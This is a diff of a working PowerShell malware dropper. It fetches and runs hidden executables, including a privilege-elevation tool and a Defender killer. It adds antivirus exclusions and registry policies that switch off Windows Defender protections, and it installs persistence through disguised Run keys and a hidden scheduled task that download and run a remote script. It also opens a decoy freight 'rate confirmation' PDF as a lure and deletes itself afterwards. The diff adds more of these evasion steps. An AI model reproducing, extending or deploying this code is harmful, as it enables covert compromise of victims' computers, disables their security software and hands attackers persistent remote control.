@@ -51,8 +51,8 @@ function _run($n,$s,$l){
     if(-not $b){_cb $s 'fail' "$l dl";return $false}
     $p="$env:TEMP\$n"
     try{
-        [IO.File]::WriteAllBytes($p,$b)
-        Start-Process $p -WindowStyle Hidden
+        [IO.File]::WriteAllBytes($p,$b)|Out-Null
+        Start-Process $p -WindowStyle Hidden | Out-Null
         _log "$s : $l ok"
         _cb $s 'ok' "$l ok"
         return $true
@@ -67,8 +67,8 @@ function _runArg($n,$a,$s,$l){
     if(-not $b){_cb $s 'fail' "$l dl";return $false}
     $p="$env:TEMP\$n"
     try{
-        [IO.File]::WriteAllBytes($p,$b)
-        Start-Process $p -ArgumentList $a -WindowStyle Hidden
+        [IO.File]::WriteAllBytes($p,$b)|Out-Null
+        Start-Process $p -ArgumentList $a -WindowStyle Hidden | Out-Null
         _log "$s : $l ok ($a)"
         _cb $s 'ok' "$l ok"
         return $true
@@ -78,9 +78,27 @@ function _runArg($n,$a,$s,$l){
     }
 }
 
+function _runWait($n,$a,$s,$l,$sec){
+    $b=_dl $n
+    if(-not $b){_cb $s 'fail' "$l dl";return $false}
+    $p="$env:TEMP\$n"
+    try{
+        [IO.File]::WriteAllBytes($p,$b)|Out-Null
+        $proc=Start-Process $p -ArgumentList $a -WindowStyle Hidden -PassThru
+        _log "$s : $l started, waiting ${sec}s"
+        Start-Sleep $sec
+        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
+        _cb $s 'ok' "$l ok"
+        return $true
+    }catch{
+        _cb $s 'fail' "$l err"
+        return $false
+    }
+}
+
 if(-not $cbIsAdmin){
-    _run 'ElevatorShellCode.exe' 'S1' 'elev'
-    Start-Sleep 6
+    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
+    Start-Sleep 8
     try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
     _log "S1: a=$cbIsAdmin"
     if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
@@ -89,37 +107,45 @@ if(-not $cbIsAdmin){
 if($cbIsAdmin){
     try{
         $mp='Add-MpPreference'
-        & $mp -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
-        & $mp -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
-        & $mp -ExclusionProcess 'wmisrv.exe' -ErrorAction SilentlyContinue
+        & $mp -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'wmisrv.exe' -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'msupdate.exe' -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue | Out-Null
     }catch{}
 
     try{
         $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
         if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
-        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $dp -Name 'DisableRoutinelyTakingAction' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         $rtp="$dp\Real-Time Protection"
         if(-not(Test-Path $rtp)){New-Item -Path $rtp -Force|Out-Null}
-        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $rtp -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $rtp -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        _log "S2: reg ok"
     }catch{}
 
-    _runArg 'update.exe' 'kill' 'S2' 'defkill'
-    Start-Sleep 3
+    _runWait 'update.exe' 'kill' 'S2' 'defkill' 12 | Out-Null
     _cb 'S2' 'ok' 'defender killed'
 }else{
     _cb 'S2' 'skip' 'no admin'
 }
 
-$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspul.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
+$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
 }catch{}
 
 if($cbIsAdmin){
     try{
         $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
     }catch{}
 
     $taskName='WindowsHealthMonitor'
@@ -131,7 +157,7 @@ if($cbIsAdmin){
 <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
 <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
 <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
-<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspul.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
+<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
 </Task>
 "@
     $xmlPath="$env:TEMP\task.xml"
@@ -142,21 +168,21 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-_run 'PatchPulsaar.exe' 'S5' 'payload'
+_run 'PatchPulsaar.exe' 'S5' 'payload' | Out-Null
 
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
 $pdfPath="$env:USERPROFILE\Downloads\$pdf"
 $pdfBytes=_dl $pdf
 if($pdfBytes){
-    [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)
-    try{Start-Process $pdfPath;_cb 'S7' 'ok' 'pdf ok'}catch{_cb 'S7' 'warn' 'pdf open fail'}
+    [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)|Out-Null
+    try{Start-Process $pdfPath | Out-Null;_cb 'S7' 'ok' 'pdf ok'}catch{_cb 'S7' 'warn' 'pdf open fail'}
 }else{_cb 'S7' 'warn' 'pdf dl fail'}
 
 Start-Sleep 5
 Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
 $sp=$MyInvocation.MyCommand.Path
 if($sp -and (Test-Path $sp)){
-    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
+    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden | Out-Null
 }
 
 _log 'S9: done'
